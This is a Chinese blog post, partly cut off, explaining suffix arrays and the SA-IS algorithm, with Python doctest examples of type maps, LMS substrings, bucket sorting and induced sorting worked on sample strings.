这个对后缀数组的排序是用的标准库的排序方法，时间复杂度是O(nlogn)，比字符串大小是O(n)，故总的时间复杂度是O(n^2logn)，而 SA-IS 的时间复杂度是O(n) ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:2:0","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"SA-IS 背景知识 在进入 SA-IS 算法的细节之前，我们需要先介绍一下 SA-IS 所建立的概念。 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:3:0","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"S-type and L-type suffixes 当排序一些字符串的后缀数组时，SA-IS 把他们分为“S 型”和“L 型”两种。S 型后缀是指那些比他们右边的后缀更小的那些后缀（所以在最终的排好序的后缀数组中靠前）。L 型就相反。 比如cabbage，offset 为 1 的后缀是abbage，它右边的后缀是bbage，可见abbage是比bbage小的，所以abbage是一个 S 型后缀。同理，ge是一个 L 型后缀（g\u003ee）。 规定最右边是一个空的（用#来表示），且它是 S 型。那么倒数第二个后缀，也就是不为空的最后一个字母是 L 型 我们可以写一个函数，接受一个字符串，并按照上面的规则映射出源字符串的每个字符是 S 型还是 L 型。 \u003e\u003e\u003e def buildTypeMap(data): ... \"\"\" ... Builds a map marking each suffix of the data as S_TYPE or L_TYPE. ... \"\"\" ... # The map should contain one more entry than there are characters ... # in the string, because we also need to store the type of the ... # empty suffix between the last character and the end of the ... # string. ... res = bytearray(len(data) + 1) ... ... # The empty suffix after the last character is S_TYPE ... res[-1] = S_TYPE ... ... # If this is an empty string... ... if not len(data): ... # ...there are no more characters, so we're done. ... return res ... ... # The suffix containing only the last character must necessarily ... # be larger than the empty suffix. ... res[-2] = L_TYPE ... ... # Step through the rest of the string from right to left. ... for i in range(len(data)-2, -1, -1): ... if data[i] \u003e data[i+1]: ... res[i] = L_TYPE ... elif data[i] == data[i+1] and res[i+1] == L_TYPE: ... res[i] = L_TYPE ... else: ... res[i] = S_TYPE ... ... return res \u003e\u003e\u003e def showTypeMap(data): ... print(data.decode('ascii')) ... print(buildTypeMap(data).decode('ascii')) \u003e\u003e\u003e showTypeMap(b'cabbage') cabbage LSLLSLLS 总结如下： s[n]==\"#\",type[n]=S_TYPE,type[n-1]=L_TYPE if s[i]==s[i+1] type[i]=type[i+1] if s[i]\u003es[i+1] type[i]=L_TYPE if s[i]\u003cs[i+1] type[i]=S_TYPE 比如： s: \"cabbage\" type: \"LSLLSLLS\" 记住最后的 S 型是一个空。 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:3:1","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"LMS 字符 就是 Left Most S 型，一串连续的 S 型中最左边的 S 型，它的左边是一个 L 型，这样的字符就是 LMS 字符 cabbage LSLLSLLS ^ ^ ^ ^指向的就是LMS字符 \u003e\u003e\u003e def isLMSChar(offset, typemap): ... \"\"\" ... Returns true if the character at offset is a left-most S-type. ... \"\"\" ... if offset == 0: ... return False ... if typemap[offset] == S_TYPE and typemap[offset - 1] == L_TYPE: ... return True ... ... return False \u003e\u003e\u003e def showTypeMap(data): ... typemap = buildTypeMap(data) ... ... print(data.decode('ascii')) ... print(typemap.decode('ascii')) ... ... print(\"\".join( ... \"^\" if isLMSChar(i, typemap) else \" \" ... for i in range(len(typemap)) ... )) \u003e\u003e\u003e showTypeMap(b'cabbage') cabbage LSLLSLLS ^ ^ ^ ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:3:2","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"LMS 子串 LMS 子串就是从一个 LMS 字符开始到下一个 LMS 字符（不包括下一个 LMS 字符）的字符串，上面的cabbage的 LMS 子串就是abb和age。 SA-IS 算法的神奇之处在于对 LMS 子串进行排序，但我们不能使用普通的字符串比较函数，因为我们不一定知道每个 LMS 字符串有多长。我们需要沿着字符串走，才能找到下一个 LMS 字符的开头，我们反正要遍历字符串，不如同时进行比较。 \u003e\u003e\u003e def lmsSubstringsAreEqual(string, typemap, offsetA, offsetB): ... \"\"\" ... Return True if LMS substrings at offsetA and offsetB are equal. ... \"\"\" ... # No other substring is equal to the empty suffix. ... if offsetA == len(string) or offsetB == len(string): ... return False ... ... i = 0 ... while True: ... aIsLMS = isLMSChar(i + offsetA, typemap) ... bIsLMS = isLMSChar(i + offsetB, typemap) ... ... # If we've found the start of the next LMS substrings... ... if (i \u003e 0 and aIsLMS and bIsLMS): ... # ...then we made it all the way through our original LMS ... # substrings without finding a difference, so we can go ... # home now. ... return True ... ... if aIsLMS != bIsLMS: ... # We found the end of one LMS substring before we reached ... # the end of the other. ... return False ... ... if string[i + offsetA] != string[i + offsetB]: ... # We found a character difference, we're done. ... return False ... ... i += 1 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:3:3","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"桶排序 因为我要要对后缀数组排序，所以所有以相同字符开头的后缀都会挨着。比如cabbage，有 2 个 a 开头的后缀，2 个 b 开头的后缀，1 个 c 开头的后缀，所以我们可以预测排好序的数组前两个是 a 开头的后缀，然后是 2 个 b 开头的，再是 1 个 c 开头的。 \u003e\u003e\u003e def findBucketSizes(string, alphabetSize=256): ... res = [0] * alphabetSize ... ... for char in string: ... res[char] += 1 ... ... return res #a = 0, b = 1, c = 2... \u003e\u003e\u003e encoded_cabbage = [2, 0, 1, 1, 0, 6, 4]#cabbage \u003e\u003e\u003e findBucketSizes(encoded_cabbage, 7) [2, 2, 1, 0, 1, 0, 1] 现在我们知道了每个 bucket 有多大，就可以简单地推导出一个数组，其中每个字符的索引都指向后缀数组中相应 bucket 的开头。 \u003e\u003e\u003e def findBucketHeads(bucketSizes): ... offset = 1 ... res = [] ... for size in bucketSizes: ... res.append(offset) ... offset += size ... ... return res \u003e\u003e\u003e encoded_cabbage = [2, 0, 1, 1, 0, 6, 4] \u003e\u003e\u003e findBucketSizes(encoded_cabbage, 7) [2, 2, 1, 0, 1, 0, 1] \u003e\u003e\u003e cabbage_buckets = findBucketSizes(encoded_cabbage, 7) \u003e\u003e\u003e findBucketHeads(cabbage_buckets) [1, 3, 5, 6, 6, 7, 7] 最后的空后缀总是在排好的后缀数组的第 0 位，所以 bucket 从 1 开始。有 2 个 a 开头的后缀所以 b 桶从 3 开始，以此类推。注意 d 桶和 e 桶都从 6 开始，但因为没有 d 开头的后缀，所以不会有问题。 同门可以用相似的方法找到桶尾。 \u003e\u003e\u003e def findBucketTails(bucketSizes): ... offset = 1 ... res = [] ... for size in bucketSizes: ... offset += size ... res.append(offset - 1) ... ... return res \u003e\u003e\u003e findBucketTails(cabbage_buckets) [2, 4, 5, 5, 6, 6, 7] 现在，讲完了所有的背景知识，我们来谈谈算法本身。 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:3:4","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"SA-IS 算法 名字由来是 Suffix Array by Induced Sorting。什么是 Induced Sorting？建立后缀数组的棘手部分是 LMS 后缀。 先宏观看一下 SA-IS 算法 \u003e\u003e\u003e def makeSuffixArrayByInducedSorting(string, alphabetSize): ... \"\"\" ... Compute the suffix array of 'string' with the SA-IS algorithm. ... \"\"\" ... ... # Classify each character of the string as S_TYPE or L_TYPE ... typemap = buildTypeMap(string) ... ... # We'll be slotting suffixes into buckets according to what ... # character they start with, so let's precompute that info now. ... bucketSizes = findBucketSizes(string, alphabetSize) ... ... # Use a simple bucket-sort to insert all the LMS suffixes into ... # approximately the right place the suffix array. ... guessedSuffixArray = guessLMSSort(string, bucketSizes, typemap) ... ... # Slot all the other suffixes into guessedSuffixArray, by using ... # induced sorting. This may move the LMS suffixes around. ... induceSortL(string, guessedSuffixArray, bucketSizes, typemap) ... induceSortS(string, guessedSuffixArray, bucketSizes, typemap) ... ... # Create a new string that summarises the relative order of LMS ... # suffixes in the guessed suffix array. ... summaryString, summaryAlphabetSize, summarySuffixOffsets = \\ ... summariseSuffixArray(string, guessedSuffixArray, typemap) ... ... # Make a sorted suffix array of the summary string. ... summarySuffixArray = makeSummarySuffixArray( ... summaryString, ... summaryAlphabetSize, ... ) ... ... # Using the suffix array of the summary string, determine exactly ... # where the LMS suffixes should go in our final array. ... result = accurateLMSSort(string, bucketSizes, typemap, ... summarySuffixArray, summarySuffixOffsets) ... ... # ...and once again, slot all the other suffixes into place with ... # induced sorting. ... induceSortL(string, result, bucketSizes, typemap) ... induceSortS(string, result, bucketSizes, typemap) ... ... return result 为了帮助说明算法的运行情况，我们将使用以下函数来显示正在进行中的后缀数组的状态。我们将在未初始化的后缀数组元素中存储-1，由于我们将在短字符串上演示该算法，我们可以假设每个偏移量将是一到两位数的长度（与\"-1 “的长度相同），并像这样呈现后缀数组的中间状态。 \u003e\u003e\u003e def showSuffixArray(arr, pos=None): ... print(\" \".join(\"%02d\" % each for each in arr)) ... ... if pos is not None: ... print(\" \".join( ... \"^^\" if each == pos else \" \" ... for each in range(len(arr)) ... )) \u003e\u003e\u003e showSuffixArray([2, -1, 4]) 02 -1 04 \u003e\u003e\u003e showSuffixArray([2, -1, 4], 2) 02 -1 04 ^^ ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:0","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"第一个猜测 我们还不知道我们的 LMS 后缀在 sfffix 数组中的确切位置，所以我们先用桶排序把它们放在大约正确的位置。在其他条件相同的情况下，较长的后缀（字符串中较早出现的后缀）排在较短的后缀（较晚出现的后缀）之后，所以我们将从左到右遍历字符串，并将我们找到的每个 LMS 后缀堆放在其桶的尾部。 \u003e\u003e\u003e def guessLMSSort(string, bucketSizes, typemap): ... \"\"\" ... Make a suffix array with LMS-substrings approximately right. ... \"\"\" ... # Create a suffix array with room for a pointer to every suffix of ... # the string, including the empty suffix at the end. ... guessedSuffixArray = [-1] * (len(string) + 1) ... ... bucketTails = findBucketTails(bucketSizes) ... ... # Bucket-sort all the LMS suffixes into their appropriate bucket. ... for i in range(len(string)): ... if not isLMSChar(i, typemap): ... # Not the start of an LMS suffix ... continue ... ... # Which bucket does this suffix go into? ... bucketIndex = string[i] ... # Add the start position at the tail of the bucket... ... guessedSuffixArray[bucketTails[bucketIndex]] = i ... # ...and move the tail pointer down. ... bucketTails[bucketIndex] -= 1 ... ... # Show the current state of the array ... showSuffixArray(guessedSuffixArray) ... ... # The empty suffix is defined to be an LMS-substring, and we know ... # it goes at the front. ... guessedSuffixArray[0] = len(string) ... ... showSuffixArray(guessedSuffixArray) ... ... return guessedSuffixArray 因此，现在我们可以猜测 LMS 子串在我们的字符串中的位置，将所有其他位置设置为-1。 \u003e\u003e\u003e cabbage_buckets = findBucketSizes(b'cabbage') \u003e\u003e\u003e cabbage_types = buildTypeMap(b'cabbage') \u003e\u003e\u003e cabbage_guess = guessLMSSort(b'cabbage', cabbage_buckets, cabbage_types) -1 -1 01 -1 -1 -1 -1 -1 -1 04 01 -1 -1 -1 -1 -1 07 04 01 -1 -1 -1 -1 -1 它找到的第一个 LMS 后缀是 abbage，在字符串的索引 1 处，所以它把它放在 a 桶的末尾。 它找到的下一个 LMS 后缀是 index 4 的 age，所以它把它放在 abbage 之前 我们到了源字符串的结尾，所以我们在后缀数组的 0 位置添加了空后缀。 为了填补剩下的位置，我们将使用 “诱导排序”；也就是根据数组中已有的内容来确定其他后缀的位置。 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:1","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"诱导排序：L 型后缀 现在我们的后缀数组中已经有了 LMS 后缀，我们可以推断出所有其他后缀的去向。我们首先扫描我们的临时后缀数组，对于每一个列出的后缀，我们检查原始字符串中它左边的后缀–如果那是 L 型，我们也会对它进行桶式排序。 \u003e\u003e\u003e def induceSortL(string, guessedSuffixArray, bucketSizes, typemap): ... \"\"\" ... Slot L-type suffixes into place. ... \"\"\" ... bucketHeads = findBucketHeads(bucketSizes) ... ... # For each cell in the suffix array.... ... for i in range(len(guessedSuffixArray)): ... if guessedSuffixArray[i] == -1: ... # No offset is recorded here. ... continue ... ... # We're interested in the suffix that begins to the left of ... # the suffix this entry points at. ... j = guessedSuffixArray[i] - 1 ... if j \u003c 0: ... # This entry in the suffix array is the suffix that begins ... # at the start of the string, offset 0. Therefore there is ... # no suffix to the left of it, and j is out of bounds of ... # the typemap. ... continue ... if typemap[j] != L_TYPE: ... # We're only interested in L-type suffixes right now. ... continue ... ... # Which bucket does this suffix go into? ... bucketIndex = string[j] ... # Add the start position at the head of the bucket... ... guessedSuffixArray[bucketHeads[bucketIndex]] = j ... # ...and move the head pointer up. ... bucketHeads[bucketIndex] += 1 ... ... showSuffixArray(guessedSuffixArray, i) 如果我们将之前的猜测反馈给这个函数，就可以看着它将 L 型后缀传播到数组中。 \u003e\u003e\u003e induceSortL(b'cabbage', cabbage_guess, cabbage_buckets, cabbage_types) 07 04 01 -1 -1 -1 06 -1 ^^ 07 04 01 03 -1 -1 06 -1 ^^ 07 04 01 03 -1 00 06 -1 ^^ 07 04 01 03 02 00 06 -1 ^^ 07 04 01 03 02 00 06 05 ^^ 根据上面的结果，我们可以知道发生了什么 我们从后缀数组中的第一个开始，它代表字符串末尾的空后缀。 空后缀前的字符为 e,偏移量是 6，所以我们将 6 放入 e 桶中。 下一个单元格的后缀 age 在偏移量为 4，它左边的后缀是偏移量为 3 的 L 型后缀 bage，所以我们将 3 放入 b 桶中。 接下来是偏移量 1 的 abbage，左边是偏移量 为 0 的 L 型后缀 cabbage，所以我们把 0 槽入 c 桶中 我们在偏移量 3 处找到了两步前存储的 bage–但偏移量 2 处的后缀(bbage)仍然是 L 型的，所以我们将它放入 b 桶中。 我们在偏移量 2 处找到了 bbage，但它左边的后缀不是 L 型，所以我们继续前进。 我们在偏移量 0 处发现了 cabbage，但它的左边没有任何东西，所以我们继续前进。 我们在偏移量 6 处发现 e，而偏移量 5 处的后缀(ge)是 L 型的，所以我们将其放入 g 桶中 我们在第 5 关找到了 ge，但它左边的后缀不是 L 型，所以我们结束了 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:2","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"诱导排序：S 型后缀 在 L 型后缀从左到右扫描后缀数组后，我们现在从右到左扫描 S 型后缀。这基本上是前面函数的镜像。 \u003e\u003e\u003e def induceSortS(string, guessedSuffixArray, bucketSizes, typemap): ... \"\"\" ... Slot S-type suffixes into place. ... \"\"\" ... bucketTails = findBucketTails(bucketSizes) ... ... for i in range(len(guessedSuffixArray)-1, -1, -1): ... j = guessedSuffixArray[i] - 1 ... if j \u003c 0: ... # This entry in the suffix array is the suffix that begins ... # at the start of the string, offset 0. Therefore there is ... # no suffix to the left of it, and j is out of bounds of ... # the typemap. ... continue ... if typemap[j] != S_TYPE: ... # We're only interested in S-type suffixes right now. ... continue ... ... # Which bucket does this suffix go into? ... bucketIndex = string[j] ... # Add the start position at the tail of the bucket... ... guessedSuffixArray[bucketTails[bucketIndex]] = j ... # ...and move the tail pointer down. ... bucketTails[bucketIndex] -= 1 ... ... showSuffixArray(guessedSuffixArray, i) \u003e\u003e\u003e induceSortS(b'cabbage', cabbage_guess, cabbage_buckets, cabbage_types) 07 04 04 03 02 00 06 05 ^^ 07 01 04 03 02 00 06 05 ^^ cabbage 只有两个 S 型后缀，所以我们只能得到两行输出。当函数扫过后缀数组时，它最终将 LMS 后缀的顺序从 “04 01 “换成了 “01 04”，这足以将我们猜测的后缀数组转化为正确的后缀数组。不过这只是一个快乐的巧合。如果我们处理我们的另一个例子。 \u003e\u003e\u003e baa = b'baabaabac' \u003e\u003e\u003e showTypeMap(baa) baabaabac LSSLSSLSLS ^ ^ ^ ^ \u003e\u003e\u003e induceSortS(baa, baa_guess, baa_buckets, baa_types) 09 -1 -1 07 04 07 06 03 00 08 ^^ 09 -1 -1 07 02 07 06 03 00 08 ^^ 09 -1 -1 05 02 07 06 03 00 08 ^^ 09 -1 01 05 02 07 06 03 00 08 ^^ 09 04 01 05 02 07 06 03 00 08 ^^ 还有一些单元格需要换一换。 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:3","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"总结猜测的后缀数组 我们从某个字母表中的一串字符开始，我们为这串字符做了一个近似的后缀数组，现在我们将用一个新的字母表中的新字符串来总结这个近似的后缀数组，它只代表了最重要的信息：在诱导 SortL()和诱导 SortS()做了它们的事情之后，LMS 后缀的最终位置。 总结的工作原理是这样的。原始字符串中的每个 LMS 后缀都有一个根据这些后缀在猜测的后缀数组中出现的顺序得到的名字。或者说，每个 LMS 后缀开头的 LMS 子串都会得到一个名字：如果两个 LMS 后缀以相同的 LMS 子串开头，它们就会得到相同的名字。这些名称按照与原始字符串中对应后缀相同的顺序组合，形成摘要字符串。 下面是相应的实现。 \u003e\u003e\u003e def summariseSuffixArray(string, guessedSuffixArray, typemap): ... \"\"\" ... Construct a 'summary string' of the positions of LMS-substrings. ... \"\"\" ... # We will use this array to store the names of LMS substrings in ... # the positions they appear in the original string. ... lmsNames = [-1] * (len(string) + 1) ... ... # Keep track of what names we've allocated. ... currentName = 0 ... ... # Where in the original string was the last LMS suffix we checked? ... lastLMSSuffixOffset = None ... ... # We know that the first LMS-substring we'll see will always be ... # the one representing the empty suffix, and it will always be at ... # position 0 of suffixOffset. ... lmsNames[guessedSuffixArray[0]] = currentName ... lastLMSSuffixOffset = guessedSuffixArray[0] ... ... showSuffixArray(lmsNames) ... ... # For each suffix in the suffix array... ... for i in range(1, len(guessedSuffixArray)): ... # ...where does this suffix appear in the original string? ... suffixOffset = guessedSuffixArray[i] ... ... # We only care about LMS suffixes. ... if not isLMSChar(suffixOffset, typemap): ... continue ... ... # If this LMS suffix starts with a different LMS substring ... # from the last suffix we looked at.... ... if not lmsSubstringsAreEqual(string, typemap, ... lastLMSSuffixOffset, suffixOffset): ... # ...then it gets a new name ... currentName += 1 ... ... # Record the last LMS suffix we looked at. ... lastLMSSuffixOffset = suffixOffset ... ... # Store the name of this LMS suffix in lmsNames, in the same ... # place this suffix occurs in the original string. ... lmsNames[suffixOffset] = currentName ... showSuffixArray(lmsNames) ... ... # Now lmsNames contains all the characters of the suffix string in ... # the correct order, but it also contains a lot of unused indexes ... # we don't care about and which we want to remove. We also take ... # this opportunity to build summarySuffixOffsets, which tells ... # us which LMS-suffix each item in the summary string represents. ... # This will be important later. ... summarySuffixOffsets = [] ... summaryString = [] ... for index, name in enumerate(lmsNames): ... if name == -1: ... continue ... summarySuffixOffsets.append(index) ... summaryString.append(name) ... ... # The alphabetically smallest character in the summary string ... # is numbered zero, so the total number of characters in our ... # alphabet is one larger than the largest numbered character. ... summaryAlphabetSize = currentName + 1 ... ... return summaryString, summaryAlphabetSize, summarySuffixOffsets 上面代码很多，看一个例子 \u003e\u003e\u003e ( ... cabbage_summary, ... cabbage_summary_alpha_size, ... cabbage_summary_suffix_offsets, ... ) = summariseSuffixArray(b'cabbage', cabbage_guess, cabbage_types) -1 -1 -1 -1 -1 -1 -1 00 -1 01 -1 -1 -1 -1 -1 00 -1 01 -1 -1 02 -1 -1 00 \u003e\u003e\u003e showSuffixArray(cabbage_guess) 07 01 04 03 02 00 06 05 在这些后缀中，我们知道前三个是 LMS 后缀，依次是空后缀、abbage 和 age。因为这三个 LMS 后缀都是以不同的 LMS 子串开始的，所以它们得到了三个不同的名字（0，1 和 2）。这些名称被存储在 lmsNames 中，位于原始字符串中相应后缀出现的位置：分别是偏移量 7、1 和 4。 计算出 lmsNames 后，我们扔掉 lmsNames 的未使用的索引，生成 摘要字符串。 \u003e\u003e\u003e cabbage_summary [1, 2, 0] 但这不是我们函数的唯一输出。我们还知道，摘要字符串是用三个不同的字符组成的字母表书写的: \u003e\u003e\u003e cabbage_summary_alpha_size 3 而且我们有一个列表，存储了与摘要字符串中每个项目相关联的后缀偏移。 \u003e\u003e\u003e cabbage_summary_suffix_offsets [1, 4, 7] 但如前所述，cabbage是一个很简单的字符串。让我们试试我们更复杂的例子，baabaabac: \u003e\u003e\u003e ( ... baa_summary, ... baa_summary_alpha_size, ... baa_summary_suffix_offsets, ... ) = summariseSuffixArray(baa, baa_guess, baa_types) -1 -1 -1 -1 -1 -1 -1 -1 -1 00 -1 -1 -1 -1 01 -1 -1 -1 -1 00 -1 01 -1 -1 01 -1 -1 -1 -1 00 -1 01 -1 -1 01 -1 -1 02 -1 00 对于这个字符串，有两个 LMS 后缀是以相同的 LMS 子串开始的：aabaabac 和 aabac 都是以 aab 开始的，这些字符的类型在这两种情况下都是 SSL。因此，这两个后缀得到了相同的名称（1），我们的摘要字符串包含两个相同的字符: \u003e\u003e\u003e baa_summary [1, 1, 2,","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:4","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"得到总结的后缀数组 我们从一个字符串开始，想建立一个后缀数组，在这个过程中，我们已经建立了第二个字符串，现在我们也要把这个字符串做一个后缀数组？这不是循环推理吗？ 嗯，差不多：这是递归推理。 如果我们要做递归，就需要有一个不是递归的基例。如果我们看一下我们上面的cabbage例子，我们得到了一个很简单的摘要字符串： \u003e\u003e\u003e cabbage_summary [1, 2, 0] 是的，这个特殊的例子恰好小到你可以在脑海中建立后缀数组，但还有一个有趣的特点：我们已经说过这是一个由三个字符组成的字母表中的字符串，而字母表中的每个字符都会在这个字符串中的某个地方精确地出现一次。这意味着我们可以用我们可靠的老桶排序来创建一个后缀数组。 如果反过来看我们 baabaabac 的例子，前景就没有那么乐观了。 \u003e\u003e\u003e baa_summary [1, 1, 2, 0] 这个字符串仍然是三个字符的字母表，但它的长度超过了三个字符，这意味着至少有一个字符必须重复，而我们不能确定一个桶排序会做正确的事情–所以在这种情况下，我们必须递归。 值得指出的是，虽然理论上你可以在字母表中拥有一个包含重复的三个字符的字符串（比如说，[1，1，0]），但我们的 summaryiseSuffixArray()函数永远不会产生这样的东西，因为它总是使用字母表中的连续字符，而且它总是将字母表的大小设置为它所使用的不同字符数。 \u003e\u003e\u003e def makeSummarySuffixArray(summaryString, summaryAlphabetSize): ... \"\"\" ... Construct a sorted suffix array of the summary string. ... \"\"\" ... if summaryAlphabetSize == len(summaryString): ... # Every character of this summary string appears once and only ... # once, so we can make the suffix array with a bucket sort. ... summarySuffixArray = [-1] * (len(summaryString) + 1) ... ... # Always include the empty suffix at the beginning. ... summarySuffixArray[0] = len(summaryString) ... ... for x in range(len(summaryString)): ... y = summaryString[x] ... summarySuffixArray[y+1] = x ... ... else: ... # This summary string is a little more complex, so we'll have ... # to use recursion. ... summarySuffixArray = makeSuffixArrayByInducedSorting( ... summaryString, ... summaryAlphabetSize, ... ) ... ... return summarySuffixArray 我们还不能在baabaabac摘要上测试这个函数，因为我们还没有完成递归的实现，但我们可以在cabbage摘要上测试它。 \u003e\u003e\u003e cabbage_summary_suffix_array = makeSummarySuffixArray( ... cabbage_summary, cabbage_summary_alpha_size, ... ) \u003e\u003e\u003e showSuffixArray(cabbage_summary_suffix_array) 03 02 00 01 和用内置排序算法比较: \u003e\u003e\u003e showSuffixArray(naivelyMakeSuffixArray(cabbage_summary)) 03 02 00 01 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:4:5","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"建立真正的后缀数组 最后，我们开始根据摘要字符串的后缀数组构建真正的、最终的后缀数组。和之前一样，我们先将 LMS 后缀放入后缀数组中，然后我们可以通过诱导排序来填充所有其他的后缀。与之前不同的是，我们不只是按照找到的任何顺序将它们桶式排序到位，而是按照摘要字符串的后缀数组决定的顺序插入。 请记住，当我们建立摘要字符串时（其中每个字符都是一个 LMS 子串的生成名称），我们还建立了一个相应的摘要 SuffixOffsets 数组，该数组将摘要字符串中的字符映射回原始字符串中的 LMS 子串（因此是 LMS 后缀），所以这就是我们要使用的。 这个过程是这样的。摘要字符串的后缀数组中的每个条目都指向摘要中的一个位置。我们在 summarySuffixOffsets 中查看相同的位置，以找到我们原始字符串的相应 LMS 后缀的偏移量。然后，我们将该 LMS 后缀放入正确的桶中，相信 summary 后缀数组会将它们按正确的顺序放入桶中。 \u003e\u003e\u003e def accurateLMSSort(string, bucketSizes, typemap, ... summarySuffixArray, summarySuffixOffsets): ... \"\"\" ... Make a suffix array with LMS suffixes exactly right. ... \"\"\" ... # A suffix for every character, plus the empty suffix. ... suffixOffsets = [-1] * (len(string) + 1) ... ... # As before, we'll be adding suffixes to the ends of their ... # respective buckets, so to keep them in the right order we'll ... # have to iterate through summarySuffixArray in reverse order. ... bucketTails = findBucketTails(bucketSizes) ... for i in range(len(summarySuffixArray)-1, 1, -1): ... stringIndex = summarySuffixOffsets[summarySuffixArray[i]] ... ... # Which bucket does this suffix go into? ... bucketIndex = string[stringIndex] ... # Add the suffix at the tail of the bucket... ... suffixOffsets[bucketTails[bucketIndex]] = stringIndex ... # ...and move the tail pointer down. ... bucketTails[bucketIndex] -= 1 ... ... showSuffixArray(suffixOffsets) ... ... # Always include the empty suffix at the beginning. ... suffixOffsets[0] = len(string) ... ... showSuffixArray(suffixOffsets) ... ... return suffixOffsets 注意：为了确保我们的 LMS 后缀能在后面的诱导排序中存活下来，我们需要把它们插入到它们的桶的最后，所以我们在向后插入后缀的时候，需要向后走过 summarySuffixArray，以保持它们的相对顺序。 另外，我们并不是对 summarySuffixArray 中的每个条目都进行处理：第一个条目对应的是 summary 